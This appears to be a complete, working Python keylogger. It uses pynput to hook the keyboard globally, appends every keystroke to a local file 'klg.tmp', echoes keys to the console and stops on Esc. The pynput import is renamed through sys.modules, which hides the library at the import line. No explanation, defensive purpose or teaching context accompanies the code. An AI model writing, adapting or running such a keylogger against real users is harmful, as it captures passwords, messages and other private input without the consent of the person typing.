import sys
sys.modules['p'] = __import__('pynput')
from p import keyboard
def on_press(key):
    try:
        with open('klg.tmp', 'a') as f:
            if key.char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789':
                f.write(key.char)
                print(f'Key pressed: {key.char}')
            else:
                f.write(f'<{key}>')
                print(f'Special key pressed: <{key}>')
    except AttributeError:
        with open('klg.tmp', 'a') as f:
            f.write(f'<{key}>')
            print(f'Special key pressed: <{key}>')
def on_release(key):
    if key == keyboard.Key.esc:
        return False
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()